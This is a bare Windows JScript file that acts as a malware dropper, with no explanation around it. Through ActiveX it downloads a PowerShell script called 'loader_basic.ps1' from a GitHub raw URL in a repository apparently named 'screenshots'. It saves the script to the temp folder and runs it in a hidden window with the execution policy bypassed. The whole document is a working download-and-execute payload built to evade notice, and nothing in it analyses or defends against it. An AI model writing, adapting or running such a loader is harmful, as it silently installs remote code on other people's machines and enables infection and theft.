var x=new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/loader_basic.ps1",0);
x.send();
var fso=new ActiveXObject("Scripting.FileSystemObject");
var t=fso.GetSpecialFolder(2)+"\\t.ps1";
fso.CreateTextFile(t).Write(x.responseText);
new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
